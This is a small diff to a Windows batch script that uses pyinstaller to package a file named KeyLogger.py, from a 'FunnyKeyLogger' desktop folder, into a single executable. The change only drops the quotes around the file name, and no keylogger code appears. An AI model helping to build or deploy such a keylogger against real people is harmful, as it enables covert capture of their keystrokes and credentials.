@@ -10,7 +10,7 @@ set desktopPath=%USERPROFILE%\Desktop
 
 cd /d %desktopPath%\FunnyKeyLogger
 
-pyinstaller --onefile 'KeyLogger.py'
+pyinstaller --onefile KeyLogger.py
 
 cd /d %desktopPath%\FunnyKeyLogger\dist\
 
